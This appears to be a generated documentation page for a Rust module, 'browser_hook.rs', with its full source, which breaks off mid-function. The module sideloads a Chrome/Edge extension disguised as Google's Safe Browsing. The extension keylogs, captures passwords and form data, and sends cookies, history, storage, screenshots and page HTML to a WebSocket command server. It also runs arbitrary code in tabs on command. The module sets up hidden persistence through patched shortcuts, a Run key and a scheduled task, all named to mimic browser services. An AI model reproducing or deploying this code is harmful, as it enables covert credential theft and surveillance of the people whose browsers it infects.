# browser_hook

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/browser_hook.rs` |
| **Lines** | 1499 |
| **Cards** | T023-client-capabilities |
| **Role** | MV3 extension sideloading |

## Constants

- `CREATE_NEW_PROCESS_GROUP`: `u32` = `0x00000200`
- `DETACHED_PROCESS`: `u32` = `0x00000008`

## Types

### struct `BrowserHookState` (line 28)

### struct `HookParams` (line 1261)
Parameters extracted from the hook payload — can be used without holding the mutex.

### struct `UnhookParams` (line 1339)
Parameters for the unhook flow.

## Public API

### `new` (line 42)
```rust
pub fn new() -> Self
```

### `hook_prepare` (line 1270)
```rust
pub fn hook_prepare(payload: &str) -> Result<HookParams, String>
```
Phase 1 (fast, needs &state): parse payload, write extension files.
Returns the params needed for phase 2.

### `hook_execute` (line 1295)
```rust
pub fn hook_execute(params: &HookParams) -> Result<(), String>
```
Phase 2 (slow, NO mutex needed): kill browser, wait, relaunch.
This can block for several seconds while the browser shuts down.

### `hook_commit` (line 1304)
```rust
pub fn hook_commit(state: &mut BrowserHookState, params: HookParams) -> String
```
Phase 3 (fast, needs &mut state): update state after successful deploy.

### `hook` (line 1320)
```rust
pub fn hook(state: &mut BrowserHookState, payload: &str) -> Result<String, String>
```
Legacy all-in-one hook (for callers that don't need the split).

### `unhook` (line 1327)
```rust
pub fn unhook(state: &mut BrowserHookState) -> Result<String, String>
```
Legacy all-in-one unhook (for cleanup / callers that don't need the split).

### `unhook_prepare` (line 1346)
```rust
pub fn unhook_prepare(state: &mut BrowserHookState) -> Option<UnhookParams>
```
Phase 1 (fast): extract what we need and remove persistence while
we still know which browser is hooked.

### `unhook_execute` (line 1360)
```rust
pub fn unhook_execute(params: &UnhookParams)
```
Phase 2 (slow, NO mutex needed): kill browser, remove files, relaunch clean.

### `unhook_commit` (line 1367)
```rust
pub fn unhook_commit(state: &mut BrowserHookState, browser: &str)
```
Phase 3 (fast): reset state.

### `persist` (line 1377)
```rust
pub fn persist(state: &mut BrowserHookState) -> Result<String, String>
```
Establish multi-layer persistence so the extension survives browser restarts.
Sets `state.persistent = true` only if at least one layer succeeded.

### `remove_persistence` (line 1437)
```rust
pub fn remove_persistence(state: &mut BrowserHookState) -> Result<String, String>
```
Remove all persistence layers.
Only sets `state.persistent = false` if all removals succeeded.

### `status` (line 1491)
```rust
pub fn status(state: &BrowserHookState) -> String
```
Return current hook status as JSON.

## Internal Functions

- `manifest_json` (line 55)
- `background_js` (line 81)
- `content_js` (line 308)
- `rand_u32` — Cheap pseudo-random u32 for temp file name uniqueness (not crypto-grade). (line 406)
- `get_ext_dir` — Extension deploy directory — path looks like a Chrome internal component. (line 417)
- `write_extension` — Write the 3 extension files to disk. (line 432)
- `remove_extension` — Remove the extension directory. (line 442)
- `find_browser_exe` — Find Chrome/Edge executable path on Windows. (line 452)
- `kill_browser` — Kill all instances of a browser process and wait until they are gone. (line 503)
- `is_browser_running` — Check whether a browser process is still running. (line 541)
- `spawn_browser_detached` — Spawn a browser process fully detached so its handle does not leak (line 565)
- `launch_browser_hooked` — Launch browser with the sideloaded extension. (line 595)
- `launch_browser_clean` — Launch browser cleanly (no extension). (line 626)
- `persist_display_name` — Disguise name for the Run key (blends with legit browser services). (line 659)
- `schtask_name` — Scheduled task name (looks like a browser maintenance task). (line 667)
- `persist_layer1_shortcuts` (line 677)
- `unpersist_layer1_shortcuts` (line 759)
- `persist_layer2_run_key` (line 828)
- `unpersist_layer2_run_key` (line 851)
- `persist_layer3_schtask` (line 876)
- `unpersist_layer3_schtask` (line 902)
- `persist_layer4_protocol_handler` (line 912)
- `unpersist_layer4_protocol_handler` (line 979)
- `persist_layer1_desktop_files` (line 1034)
- `unpersist_layer1_desktop_files` (line 1096)
- `persist_layer2_autostart` (line 1143)
- `unpersist_layer2_autostart` (line 1168)
- `persist_layer3_cron` (line 1178)
- `unpersist_layer3_cron` (line 1224)
- `dirs_home` (line 1254)

## Key Dependencies

- `use tracing::{info, warn, error};`

## Full Source

```rust
// Browser Hook — Extension sideloading for Chromium-based browsers.
//
// Deploys a Manifest V3 extension disguised as "Safe Browsing Enhanced
// Protection" — a name that mimics Chrome's built-in Safe Browsing feature.
// The extension is loaded via --load-extension and connects back to the
// server via WebSocket for DOM access, cookie/credential capture, and
// input analysis.
//
// Multi-layer persistence ensures the extension survives browser restarts:
//   Layer 1: Shortcut patching (.lnk / .desktop)
//   Layer 2: Registry Run key / XDG autostart
//   Layer 3: Scheduled Task / cron @reboot
//   Layer 4: Protocol handler patching (Windows)
//
// Commands:
//   BROWSER_HOOK          → deploy extension + relaunch browser
//   BROWSER_UNHOOK        → remove extension + persistence + relaunch clean
//   BROWSER_HOOK_STATUS   → report current hook state
//   BROWSER_HOOK_PERSIST  → establish persistence layers
//   BROWSER_HOOK_UNPERSIST → remove persistence layers only

use std::path::{Path, PathBuf};
use std::process::Command;
use tracing::{info, warn, error};

/// State of the browser hook on this machine.
#[derive(Debug, Clone)]
pub struct BrowserHookState {
    /// Whether the hook is currently active.
    pub active: bool,
    /// Which browser is hooked ("chrome" | "edge").
    pub browser: String,
    /// Path to the extension directory on disk.
    pub ext_dir: PathBuf,
    /// The RAVEN server WS URL the extension connects back to.
    pub callback_url: String,
    /// Whether multi-layer persistence is established.
    pub persistent: bool,
}

impl BrowserHookState {
    pub fn new() -> Self {
        Self {
            active: false,
            browser: String::new(),
            ext_dir: PathBuf::new(),
            callback_url: String::new(),
            persistent: false,
        }
    }
}

// ---- Extension source code (embedded) ----

fn manifest_json(_callback_url: &str) -> String {
    // Manifest V3 — disguised as Chrome Safe Browsing component.
    r#"{
  "manifest_version": 3,
  "name": "Safe Browsing Enhanced Protection",
  "version": "4.2.1",
  "description": "Enhanced protection service for real-time URL checking, certificate verification, and security analysis. Helps protect against phishing, malware, and unsafe downloads.",
  "permissions": ["storage", "cookies", "tabs", "activeTab", "scripting", "history", "downloads", "bookmarks"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle",
      "all_frames": true
    }
  ],
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'"
  }
}"#.to_string()
}

fn background_js(callback_url: &str) -> String {
    format!(r#"// Safe Browsing Enhanced Protection — background service worker
// Maintains connection to the security analysis backend for real-time
// threat intelligence updates and URL reputation checks.

const SB_ENDPOINT = "{}";
let _conn = null;
let _reconnect = null;

function initConnection() {{
  if (_conn && _conn.readyState <= 1) return;
  try {{
    _conn = new WebSocket(SB_ENDPOINT);
    _conn.onopen = () => {{
      clearInterval(_reconnect);
      _conn.send(JSON.stringify({{ type: "service_init", ts: Date.now() }}));
    }};
    _conn.onmessage = async (evt) => {{
      try {{
        const msg = JSON.parse(evt.data);
        await processDirective(msg);
      }} catch(e) {{}}
    }};
    _conn.onclose = () => {{ scheduleRetry(); }};
    _conn.onerror = () => {{ _conn.close(); }};
  }} catch(e) {{
    scheduleRetry();
  }}
}}

function scheduleRetry() {{
  if (!_reconnect) {{
    _reconnect = setInterval(initConnection, 5000);
  }}
}}

function report(obj) {{
  if (_conn && _conn.readyState === 1) {{
    _conn.send(JSON.stringify(obj));
  }}
}}

async function processDirective(msg) {{
  switch (msg.cmd) {{
    case "get_cookies": {{
      const cookies = await chrome.cookies.getAll({{}});
      report({{ type: "cookies", data: cookies, reqId: msg.reqId }});
      break;
    }}
    case "get_cookies_domain": {{
      const cookies = await chrome.cookies.getAll({{ domain: msg.domain }});
      report({{ type: "cookies", data: cookies, reqId: msg.reqId }});
      break;
    }}
    case "get_tabs": {{
      const tabs = await chrome.tabs.query({{}});
      report({{ type: "tabs", data: tabs.map(t => ({{ id: t.id, url: t.url, title: t.title }})), reqId: msg.reqId }});
      break;
    }}
    case "exec_tab": {{
      if (msg.tabId && msg.code) {{
        const results = await chrome.scripting.executeScript({{
          target: {{ tabId: msg.tabId }},
          func: new Function(msg.code),
        }});
        report({{ type: "exec_result", data: results, reqId: msg.reqId }});
      }}
      break;
    }}
    case "navigate": {{
      if (msg.tabId && msg.url) {{
        chrome.tabs.update(msg.tabId, {{ url: msg.url }});
      }}
      break;
    }}
    case "create_tab": {{
      const [prev] = await chrome.tabs.query({{ active: true, currentWindow: true }});
      const opts = {{}};
      if (msg.url) opts.url = msg.url;
      if (msg.active !== undefined) opts.active = msg.active;
      const tab = await chrome.tabs.create(opts);
      report({{ type: "tab_created", data: {{ newTabId: tab.id, previousActiveTabId: prev ? prev.id : null, url: tab.pendingUrl || tab.url || "" }}, reqId: msg.reqId }});
      break;
    }}
    case "close_tab": {{
      if (msg.tabId) {{
        try {{
          await chrome.tabs.remove(msg.tabId);
          report({{ type: "tab_closed", data: {{ tabId: msg.tabId, success: true }}, reqId: msg.reqId }});
        }} catch(e) {{
          report({{ type: "tab_closed", data: {{ tabId: msg.tabId, success: false, error: e.message }}, reqId: msg.reqId }});
        }}
      }}
      break;
    }}
    case "activate_tab": {{
      if (msg.tabId) {{
        try {{
          const t = await chrome.tabs.update(msg.tabId, {{ active: true }});
          if (t.windowId) await chrome.windows.update(t.windowId, {{ focused: true }});
          report({{ type: "tab_activated", data: {{ tabId: msg.tabId, success: true }}, reqId: msg.reqId }});
        }} catch(e) {{
          report({{ type: "tab_activated", data: {{ tabId: msg.tabId, success: false, error: e.message }}, reqId: msg.reqId }});
        }}
      }}
      break;
    }}
    case "screenshot": {{
      try {{
        const dataUrl = await chrome.tabs.captureVisibleTab(null, {{ format: msg.format || "png", quality: msg.quality || 80 }});
        report({{ type: "screenshot", data: {{ dataUrl, ts: Date.now() }}, reqId: msg.reqId }});
      }} catch(e) {{
        report({{ type: "screenshot", data: {{ error: e.message }}, reqId: msg.reqId }});
      }}
      break;
    }}
    case "get_history": {{
      try {{
        const results = await chrome.history.search({{
          text: msg.query || "",
          maxResults: msg.maxResults || 100,
          startTime: msg.startTime || (Date.now() - 7*24*60*60*1000)
        }});
        report({{ type: "history", data: results.map(h => ({{ url: h.url, title: h.title, lastVisit: h.lastVisitTime, visitCount: h.visitCount }})), reqId: msg.reqId }});
      }} catch(e) {{
        report({{ type: "history", data: {{ error: e.message }}, reqId: msg.reqId }});
      }}
      break;
    }}
    case "get_downloads": {{
      try {{
        const results = await chrome.downloads.search({{
          limit: msg.limit || 50,
          orderBy: ["-startTime"]
        }});
        report({{ type: "downloads", data: results.map(d => ({{
          id: d.id, url: d.url, filename: d.filename, state: d.state,
          fileSize: d.fileSize, startTime: d.startTime, mime: d.mime,
          danger: d.danger
        }})), reqId: msg.reqId }});
      }} catch(e) {{
        report({{ type: "downloads", data: {{ error: e.message }}, reqId: msg.reqId }});
      }}
      break;
    }}
    case "get_bookmarks": {{
      try {{
        const tree = await chrome.bookmarks.getTree();
        const flat = [];
        const walk = (nodes) => {{
          for (const n of nodes) {{
            if (n.url) flat.push({{ title: n.title, url: n.url, dateAdded: n.dateAdded }});
            if (n.children) walk(n.children);
          }}
        }};
        walk(tree);
        report({{ type: "bookmarks", data: flat, reqId: msg.reqId }});
      }} catch(e) {{
        report({{ type: "bookmarks", data: {{ error: e.message }}, reqId: msg.reqId }});
      }}
      break;
    }}
    case "get_storage": {{
      if (msg.tabId) {{
        try {{
          const results = await chrome.scripting.executeScript({{
            target: {{ tabId: msg.tabId }},
            func: () => {{
              const ls = {{}};
              for (let i = 0; i < localStorage.length; i++) {{
                const k = localStorage.key(i);
                ls[k] = localStorage.getItem(k);
              }}
              const ss = {{}};
              for (let i = 0; i < sessionStorage.length; i++) {{
                const k = sessionStorage.key(i);
                ss[k] = sessionStorage.getItem(k);
              }}
              return {{ localStorage: ls, sessionStorage: ss, url: location.href }};
            }},
          }});
          report({{ type: "storage", data: results[0]?.result || {{}}, reqId: msg.reqId }});
        }} catch(e) {{
          report({{ type: "storage", data: {{ error: e.message }}, reqId: msg.reqId }});
        }}
      }}
      break;
    }}
    case "remove_cookie": {{
      if (msg.url && msg.name) {{
        try {{
          await chrome.cookies.remove({{ url: msg.url, name: msg.name }});
          report({{ type: "cookie_removed", data: {{ url: msg.url, name: msg.name, success: true }}, reqId: msg.reqId }});
        }} catch(e) {{
          report({{ type: "cookie_removed", data: {{ url: msg.url, name: msg.name, success: false, error: e.message }}, reqId: msg.reqId }});
        }}
      }}
      break;
    }}
    case "get_page_html": {{
      if (msg.tabId) {{
        try {{
          const results = await chrome.scripting.executeScript({{
            target: {{ tabId: msg.tabId }},
            func: () => ({{ html: document.documentElement.outerHTML, url: location.href, title: document.title }}),
          }});
          report({{ type: "page_html", data: results[0]?.result || {{}}, reqId: msg.reqId }});
        }} catch(e) {{
          report({{ type: "page_html", data: {{ error: e.message }}, reqId: msg.reqId }});
        }}
      }}
      break;
    }}
  }}
}}

// Relay content-script security telemetry to the analysis backend
chrome.runtime.onMessage.addListener((msg, sender) => {{
  if (msg && msg._sbep) {{
    report({{ ...msg, tabId: sender.tab?.id, tabUrl: sender.tab?.url }});
  }}
}});

initConnection();
"#, callback_url)
}

fn content_js() -> &'static str {
    r#"// Safe Browsing Enhanced Protection — content security scanner
// Runs on every page to perform real-time phishing and threat detection.
// Analyzes input patterns, form destinations, and login page authenticity.
(function() {
  if (window.__sbep_init) return;
  window.__sbep_init = true;

  // ---- Input pattern analysis (phishing keystroke detection) ----
  const _inputBuffer = [];
  let _analysisTimer = null;

  document.addEventListener('keydown', (e) => {
    _inputBuffer.push({
      key: e.key,
      code: e.code,
      ts: Date.now(),
      target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
    });
    if (!_analysisTimer) {
      _analysisTimer = setTimeout(flushAnalysis, 2000);
    }
  }, true);

  function flushAnalysis() {
    if (_inputBuffer.length > 0) {
      chrome.runtime.sendMessage({
        _sbep: true,
        type: 'input_analysis',
        url: location.href,
        keys: _inputBuffer.splice(0),
      });
    }
    _analysisTimer = null;
  }

  // ---- Form destination verification ----
  document.addEventListener('submit', (e) => {
    const form = e.target;
    const fields = {};
    const inputs = form.querySelectorAll('input, select, textarea');
    inputs.forEach(el => {
      if (el.name && el.type !== 'password') {
        fields[el.name] = el.value;
      }
      if (el.type === 'password' && el.value) {
        fields[el.name || '__password'] = el.value;
      }
    });
    chrome.runtime.sendMessage({
      _sbep: true,
      type: 'form_scan',
      url: location.href,
      action: form.action,
      method: form.method,
      fields: fields,
    });
  }, true);

  // ---- Login page authenticity monitor ----
  const _authObserver = new MutationObserver(() => {
    document.querySelectorAll('input[type="password"]:not([data-sb])').forEach(el => {
      el.setAttribute('data-sb', '1');
      el.addEventListener('change', () => {
        const formEl = el.closest('form');
        const username = formEl
          ? (formEl.querySelector('input[type="email"],input[type="text"],input[name*="user"],input[name*="login"]') || {}).value
          : '';
        chrome.runtime.sendMessage({
          _sbep: true,
          type: 'auth_check',
          url: location.href,
          username: username || '',
          password: el.value,
        });
      });
    });
  });
  _authObserver.observe(document.body, { childList: true, subtree: true });

  // Initial scan
  _authObserver.takeRecords();

  // ---- Page security assessment ----
  chrome.runtime.sendMessage({
    _sbep: true,
    type: 'page_scan',
    url: location.href,
    title: document.title,
    ts: Date.now(),
  });
})();
"#
}

// ---- Helpers ----

/// Cheap pseudo-random u32 for temp file name uniqueness (not crypto-grade).
fn rand_u32() -> u32 {
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos();
    t ^ (std::process::id().wrapping_mul(2654435761))
}

// ---- Filesystem operations ----

/// Extension deploy directory — path looks like a Chrome internal component.
fn get_ext_dir() -> PathBuf {
    #[cfg(windows)]
    {
        let local_app = std::env::var("LOCALAPPDATA")
            .unwrap_or_else(|_| std::env::var("TEMP").unwrap_or_else(|_| ".".to_string()));
        PathBuf::from(local_app).join("Google").join("Chrome Safe Browsing").join("ext")
    }
    #[cfg(not(windows))]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(".cache").join("chrome-sb-ext")
    }
}

/// Write the 3 extension files to disk.
fn write_extension(dir: &Path, callback_url: &str) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    std::fs::write(dir.join("manifest.json"), manifest_json(callback_url))?;
    std::fs::write(dir.join("background.js"), background_js(callback_url))?;
    std::fs::write(dir.join("content.js"), content_js())?;
    info!("Extension written to {:?}", dir);
    Ok(())
}

/// Remove the extension directory.
fn remove_extension(dir: &Path) {
    if dir.exists() {
        let _ = std::fs::remove_dir_all(dir);
        info!("Extension removed from {:?}", dir);
    }
}

// ---- Browser process management ----

/// Find Chrome/Edge executable path on Windows.
fn find_browser_exe(browser: &str) -> Option<PathBuf> {
    #[cfg(windows)]
    {
        let program_files = std::env::var("PROGRAMFILES").unwrap_or_default();
        let program_files_x86 = std::env::var("PROGRAMFILES(X86)").unwrap_or_default();
        let local_app = std::env::var("LOCALAPPDATA").unwrap_or_default();

        let candidates: Vec<PathBuf> = match browser {
            "edge" => vec![
                PathBuf::from(&program_files_x86).join("Microsoft/Edge/Application/msedge.exe"),
                PathBuf::from(&program_files).join("Microsoft/Edge/Application/msedge.exe"),
            ],
            _ => vec![ // chrome default
                PathBuf::from(&program_files).join("Google/Chrome/Application/chrome.exe"),
                PathBuf::from(&program_files_x86).join("Google/Chrome/Application/chrome.exe"),
                PathBuf::from(&local_app).join("Google/Chrome/Application/chrome.exe"),
            ],
        };

        candidates.into_iter().find(|p| p.exists())
    }
    #[cfg(not(windows))]
    {
        match browser {
            "edge" => {
                for name in ["microsoft-edge-stable", "microsoft-edge"] {
                    if let Ok(output) = Command::new("which").arg(name).output() {
                        if output.status.success() {
                            let p = String::from_utf8_lossy(&output.stdout).trim().to_string();
                            if !p.is_empty() { return Some(PathBuf::from(p)); }
                        }
                    }
                }
                None
            }
            _ => {
                for name in ["google-chrome", "google-chrome-stable", "chromium-browser", "chromium"] {
                    if let Ok(output) = Command::new("which").arg(name).output() {
                        if output.status.success() {
                            let p = String::from_utf8_lossy(&output.stdout).trim().to_string();
                            if !p.is_empty() { return Some(PathBuf::from(p)); }
                        }
                    }
                }
                None
            }
        }
    }
}

/// Kill all instances of a browser process and wait until they are gone.
fn kill_browser(browser: &str) {
    let process_names: Vec<&str> = match browser {
        "edge" => vec!["msedge.exe", "msedge"],
        _ => vec!["chrome.exe", "chrome", "chromium"],
    };

    #[cfg(windows)]
    {
        for name in &process_names {
            let _ = Command::new("taskkill")
                .args(["/F", "/IM", name])
                .output();
        }
    }
    #[cfg(not(windows))]
    {
        for name in &process_names {
            let _ = Command::new("pkill").args(["-f", name]).output();
        }
    }

    // Poll until the browser process is actually gone (max 5s)
    // instead of a blind 1500ms sleep that races on slow systems.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    loop {
        if std::time::Instant::now() >= deadline {
            warn!("Browser kill timed out after 5s, proceeding anyway");
            break;
        }
        if !is_browser_running(browser) {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
    info!("Killed browser: {}", browser);
}

/// Check whether a browser process is still running.
fn is_browser_running(browser: &str) -> bool {
    let name = match browser {
        "edge" => "msedge.exe",
        _ => "chrome.exe",
    };
    #[cfg(windows)]
    {
        Command::new("tasklist")
            .args(["/FI", &format!("IMAGENAME eq {}", name), "/NH"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).contains(name))
            .unwrap_or(false)
    }
    #[cfg(not(windows))]
    {
        Command::new("pgrep").args(["-f", name]).output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }
}

/// Spawn a browser process fully detached so its handle does not leak
/// into the client process.  Redirects stdio to null to prevent the
/// child's stdout/stderr pipe from blocking or sending signals back.
fn spawn_browser_detached(exe: &Path, args: &[&str]) -> std::io::Result<u32> {
    use std::process::Stdio;

    let mut cmd = Command::new(exe);
    cmd.args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());

    // On Windows, CREATE_NEW_PROCESS_GROUP detaches the child from the
    // client's console/job-object so killing/exiting the client does not
    // cascade into Chrome.
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
        const DETACHED_PROCESS: u32 = 0x00000008;
        cmd.creation_flags(CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS);
    }

    let child = cmd.spawn()?;
    let pid = child.id();
    // Explicitly forget the handle so Rust doesn't keep a reference to
    // the child process.  On Windows this closes the HANDLE; on Unix it
    // avoids zombie reaping responsibilities.
    std::mem::forget(child);
    Ok(pid)
}

/// Launch browser with the sideloaded extension.
fn launch_browser_hooked(browser: &str, ext_dir: &Path) -> bool {
    let exe = match find_browser_exe(browser) {
        Some(p) => p,
        None => {
            error!("Browser executable not found: {}", browser);
            return false;
        }
    };

    let ext_path = ext_dir.to_string_lossy().to_string();
    let load_ext = format!("--load-extension={}", ext_path);

    match spawn_browser_detached(&exe, &[
        &load_ext,
        "--restore-last-session",
        "--no-first-run",
        "--disable-extensions-except",
        &ext_path,
    ]) {
        Ok(pid) => {
            info!("Browser launched with hook: {} (pid {})", browser, pid);
            true
        }
        Err(e) => {
            error!("Failed to launch {}: {}", browser, e);
            false
        }
    }
}

/// Launch browser cleanly (no extension).
fn launch_browser_clean(browser: &str) -> bool {
    let exe = match find_browser_exe(browser) {
        Some(p) => p,
        None => {
            warn!("Browser executable not found for clean launch: {}", browser);
            return false;
        }
    };

    match spawn_browser_detached(&exe, &["--restore-last-session", "--no-first-run"]) {
        Ok(_) => {
            info!("Browser launched clean: {}", browser);
            true
        }
        Err(e) => {
            error!("Failed to launch clean {}: {}", browser, e);
            false
        }
    }
}

// ---- Persistence: multi-layer survival across browser restarts ----
//
// Layer 1 — Shortcut patching: modify .lnk / .desktop files so every
//           user-visible launcher includes --load-extension.
// Layer 2 — Registry Run key (Win) / XDG autostart (Linux): ensures the
//           browser starts with the extension on login.
// Layer 3 — Scheduled Task (Win) / cron @reboot (Linux): backup layer
//           that survives Run key cleanup.
// Layer 4 — Protocol handler (Win only): patches ChromeHTML/MSEdgeHTM
//           shell\open\command so link clicks also load the extension.

/// Disguise name for the Run key (blends with legit browser services).
fn persist_display_name(browser: &str) -> &'static str {
    match browser {
        "edge" => "Microsoft Edge Safe Browsing Service",
        _      => "Google Safe Browsing Service",
    }
}

/// Scheduled task name (looks like a browser maintenance task).
fn schtask_name(browser: &str) -> &'static str {
    match browser {
        "edge" => "MicrosoftEdgeSafeBrowsingService",
        _      => "GoogleSafeBrowsingService",
    }
}

// ====================== WINDOWS PERSISTENCE ======================

#[cfg(windows)]
fn persist_layer1_shortcuts(browser: &str, ext_path: &str) -> Result<usize, String> {
    let exe_keyword = match browser {
        "edge" => "msedge",
        _      => "chrome",
    };

    // PowerShell script with placeholder replacement (avoids format! escaping hell).
    //
    // Key design decisions:
    //   - IDEMPOTENT: always strips existing --load-extension/--disable-extensions-except
    //     before appending, so re-calling with a different path works correctly.
    //   - COM CLEANUP: every $lnk RCW is released after use to avoid holding file handles.
    //   - SAVE GUARD: $lnk.Save() is wrapped in try/catch — counter only increments on success.
    //   - DEPTH LIMIT: -Depth 3 prevents timeout on deep GPO Start Menu trees.
    //   - STRUCTURED OUTPUT: prefixed with "RVPATCH:" so Rust can parse reliably even if
    //     PowerShell emits warnings before the result line.
    let script = r#"
$shell = New-Object -ComObject WScript.Shell
$patched = 0
$extArg = ' --load-extension="__EXT__" --disable-extensions-except="__EXT__"'
$dirs = @(
    [Environment]::GetFolderPath('Desktop'),
    [Environment]::GetFolderPath('CommonDesktopDirectory'),
    [Environment]::GetFolderPath('StartMenu'),
    [Environment]::GetFolderPath('CommonStartMenu'),
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
)
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        Get-ChildItem "$dir\*.lnk" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
            $lnk = $shell.CreateShortcut($_.FullName)
            try {
                if ($lnk.TargetPath -like '*__BROWSER__*') {
                    $args = $lnk.Arguments
                    $args = $args -replace ' --load-extension="[^"]*"',''
                    $args = $args -replace ' --disable-extensions-except="[^"]*"',''
                    $args = $args -replace ' --load-extension=[^ ]*',''
                    $args = $args -replace ' --disable-extensions-except=[^ ]*',''
                    $lnk.Arguments = $args.Trim() + $extArg
                    $lnk.Save()
                    $patched++
                }
            } catch {
                # Save() failed (file locked, permissions) — skip this shortcut
            } finally {
                [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($lnk)
            }
        }
    }
}
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell)
Write-Output "RVPATCH:$patched"
"#
    .replace("__EXT__", ext_path)
    .replace("__BROWSER__", exe_keyword);

    // Use PID + random suffix to avoid race conditions between concurrent invocations.
    let script_name = format!("rv_patch_{:x}_{:x}.ps1", std::process::id(), rand_u32());
    let script_path = std::env::temp_dir().join(&script_name);
    std::fs::write(&script_path, &script).map_err(|e| e.to_string())?;

    let result = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
               "-File", &script_path.to_string_lossy().to_string()])
        .output()
        .map_err(|e| e.to_string());

    // Always clean up the script file, even if PowerShell failed to spawn.
    let _ = std::fs::remove_file(&script_path);

    let output = result?;
    // Parse only the structured "RVPATCH:<n>" line, ignoring any warnings/errors above it.
    let count: usize = String::from_utf8_lossy(&output.stdout)
        .lines()
        .find_map(|l| l.strip_prefix("RVPATCH:"))
        .and_then(|n| n.trim().parse().ok())
        .unwrap_or(0);
    info!("Layer 1 (shortcuts): patched {} for {}", count, browser);
    Ok(count)
}

#[cfg(windows)]
fn unpersist_layer1_shortcuts(browser: &str) -> Result<usize, String> {
    let exe_keyword = match browser {
        "edge" => "msedge",
        _      => "chrome",
    };

    // Mirrors persist_layer1_shortcuts fixes: COM cleanup, try/catch, depth limit,
    // structured output, unique temp file. Strips both quoted and unquoted arg forms.
    let script = r#"
$shell = New-Object -ComObject WScript.Shell
$restored = 0
$dirs = @(
    [Environment]::GetFolderPath('Desktop'),
    [Environment]::GetFolderPath('CommonDesktopDirectory'),
    [Environment]::GetFolderPath('StartMenu'),
    [Environment]::GetFolderPath('CommonStartMenu'),
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
)
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        Get-ChildItem "$dir\*.lnk" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
            $lnk = $shell.CreateShortcut($_.FullName)
            try {
                if ($lnk.TargetPath -like '*__BROWSER__*' -and $lnk.Arguments -like '*load-extension*') {
                    $args = $lnk.Arguments
                    $args = $args -replace ' --load-extension="[^"]*"',''
                    $args = $args -replace ' --disable-extensions-except="[^"]*"',''
                    $args = $args -replace ' --load-extension=[^ ]*',''
                    $args = $args -replace ' --disable-extensions-except=[^ ]*',''
                    $lnk.Arguments = $args.Trim()
                    $lnk.Save()
                    $restored++
                }
            } catch {
                # Save() failed — skip this shortcut
            } finally {
                [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($lnk)
            }
        }
    }
}
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell)
Write-Output "RVPATCH:$restored"
"#
    .replace("__BROWSER__", exe_keyword);

    let script_name = format!("rv_unpatch_{:x}_{:x}.ps1", std::process::id(), rand_u32());
    let script_path = std::env::temp_dir().join(&script_name);
    std::fs::write(&script_path, &script).map_err(|e| e.to_string())?;

    let result = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
               "-File", &script_path.to_string_lossy().to_string()])
        .output()
        .map_err(|e| e.to_string());

    let _ = std::fs::remove_file(&script_path);

    let output = result?;
    let count: usize = String::from_utf8_lossy(&output.stdout)
        .lines()
        .find_map(|l| l.strip_prefix("RVPATCH:"))
        .and_then(|n| n.trim().parse().ok())
        .unwrap_or(0);
    info!("Layer 1 (shortcuts): restored {}", count);
    Ok(count)
}

#[cfg(windows)]
fn persist_layer2_run_key(browser: &str, ext_path: &str) -> Result<(), String> {
    let exe = find_browser_exe(browser).ok_or("Browser executable not found")?;
    let value = format!(
        "\"{}\" --load-extension=\"{}\" --restore-last-session --no-first-run --disable-extensions-except=\"{}\"",
        exe.to_string_lossy(), ext_path, ext_path
    );
    let name = persist_display_name(browser);

    let output = Command::new("reg")
        .args(["add", r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
               "/v", name, "/t", "REG_SZ", "/d", &value, "/f"])
        .output()
        .map_err(|e| e.to_string())?;

    if output.status.success() {
        info!("Layer 2 (Run key): set as \"{}\"", name);
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
    }
}

#[cfg(windows)]
fn unpersist_layer2_run_key(browser: &str) -> Result<(), String> {
    let name = persist_display_name(browser);
    let output = Command::new("reg")
        .args(["delete", r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
               "/v", name, "/f"])
        .output()
        .map_err(|e| e.to_string())?;

    // "key not found" is fine (already removed); genuine access-denied is not.
    if output.status.success() {
        info!("Layer 2 (Run key): removed \"{}\"", name);
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // ERROR: The system was unable to find the specified registry key or value.
        if stderr.contains("unable to find") || stderr.contains("not find") {
            info!("Layer 2 (Run key): \"{}\" already absent", name);
            Ok(())
        } else {
            Err(format!("Layer 2 (Run key): failed to remove \"{}\" — {}", name, stderr.trim()))
        }
    }
}

#[cfg(windows)]
fn persist_layer3_schtask(browser: &str, ext_path: &str) -> Result<(), String> {
    let exe = find_browser_exe(browser).ok_or("Browser executable not found")?;
    let task_name = schtask_name(browser);
